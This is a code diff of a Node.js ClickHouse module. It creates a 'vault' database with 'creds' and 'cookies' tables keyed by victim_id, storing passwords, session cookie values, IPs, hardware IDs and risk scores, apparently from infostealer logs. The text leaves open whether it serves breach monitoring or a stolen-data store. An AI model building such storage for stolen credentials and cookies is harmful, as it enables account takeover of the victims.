@@ -10,7 +10,7 @@ const buildClickHouseUrl = () => {
   // Build URL from individual components
   const host = process.env.CLICKHOUSE_HOST || 'localhost'
   const port = process.env.CLICKHOUSE_PORT || '8123'
-  const protocol = process.env.CLICKHOUSE_PROTOCOL || 'http'
+  const protocol = process.env.CLICKHOUSE_PROTOCOL || (port === '8443' ? 'https' : 'http')
   
   return `${protocol}://${host}:${port}`
 }
@@ -20,7 +20,7 @@ const clickhouseUrl = buildClickHouseUrl()
 // Create ClickHouse client
 const client = createClient({
   url: clickhouseUrl,
-  username: process.env.CLICKHOUSE_USERNAME || 'default',
+  username: process.env.CLICKHOUSE_USER || 'default',
   password: process.env.CLICKHOUSE_PASSWORD || '',
   database: process.env.CLICKHOUSE_DATABASE || 'vault',
   clickhouse_settings: {
@@ -40,7 +40,7 @@ export async function checkConnection() {
     console.log('Attempting to connect to ClickHouse...')
     console.log('URL:', clickhouseUrl)
     console.log('Database:', process.env.CLICKHOUSE_DATABASE || 'vault')
-    console.log('Username:', process.env.CLICKHOUSE_USERNAME || 'default')
+    console.log('Username:', process.env.CLICKHOUSE_USER || 'default')
     
     const result = await client.query({
       query: 'SELECT version()',
@@ -74,37 +74,39 @@ export async function ensureSchema() {
       query: 'CREATE DATABASE IF NOT EXISTS vault'
     })
     
-    // Create the creds table with the schema from clickhouse_schema.sql
+    // Create the creds table with the user's provided schema
     await client.command({
       query: `
         CREATE TABLE IF NOT EXISTS vault.creds
         (
-            ts           DateTime        DEFAULT now(),
-            victim_id    String,
-            source_name  String,
-            domain       LowCardinality(String) DEFAULT '',
-            email        String DEFAULT '',
-            username     String DEFAULT '',
-            password     Nullable(String),
-            phone        Nullable(String),
-            name         Nullable(String),
-            address      Nullable(String),
-            country      Nullable(String),
-            origin       Nullable(String),
-            fields       Array(String),
-            
-            -- Personal Info fields
-            hostname     Nullable(String),
-            ip_address   Nullable(String),
-            language     Nullable(String),
-            timezone     Nullable(String),
-            
-            -- System Info fields  
-            os_version   Nullable(String),
-            hwid         Nullable(String),
-            cpu_name     Nullable(String),
-            gpu          Nullable(String),
-            ram_size     Nullable(String),
+            ts                DateTime        DEFAULT now(),
+            victim_id         String,
+            source_name       String,
+            url               String,
+            domain            LowCardinality(String),
+            email             String,
+            username          String,
+            password          Nullable(String),
+            phone             Nullable(String),
+            name              Nullable(String),
+            address           Nullable(String),
+            country           Nullable(String),
+            origin            Nullable(String),
+            fields            Array(String),
+            hostname          Nullable(String),
+            ip_address        String,
+            language          Nullable(String),
+            timezone          Nullable(String),
+            os_version        Nullable(String),
+            hwid              Nullable(String),
+            cpu_name          Nullable(String),
+            gpu               Nullable(String),
+            ram_size          Nullable(String),
+            account_type      LowCardinality(String),
+            risk_score        UInt8,
+            risk_category     LowCardinality(String),
+            is_privileged     Bool,
+            breach_impact     LowCardinality(String),
 
             INDEX bf_email   email    TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
             INDEX bf_user    username TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
@@ -113,6 +115,36 @@ export async function ensureSchema() {
         )
         ENGINE = ReplacingMergeTree(ts)
         ORDER BY (domain, email, username, victim_id)
+        SETTINGS index_granularity = 8192
+      `
+    })
+
+    // Create the cookies table with the user's provided schema
+    await client.command({
+      query: `
+        CREATE TABLE IF NOT EXISTS vault.cookies
+        (
+            ts                    DateTime        DEFAULT now(),
+            victim_id             String,
+            domain                LowCardinality(String),
+            cookie_name           String,
+            cookie_path           String,
+            cookie_value          Nullable(String),
+            cookie_value_length   UInt32,
+            secure                Bool,
+            cookie_type           LowCardinality(String),
+            risk_level            LowCardinality(String),
+            browser_source        LowCardinality(String),
+            hostname              Nullable(String),
+            ip_address            Nullable(String),
+            country               Nullable(String),
+
+            INDEX bf_domain      domain      TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
+            INDEX bf_cookie_name cookie_name TYPE tokenbf_v1(1024, 3, 0)  GRANULARITY 64,
+            INDEX set_cookie_type cookie_type TYPE set(8192)         GRANULARITY 64
+        )
+        ENGINE = ReplacingMergeTree(ts)
+        ORDER BY (domain, cookie_name, victim_id, ts)
         SETTINGS index_granularity = 8192
       `
     })
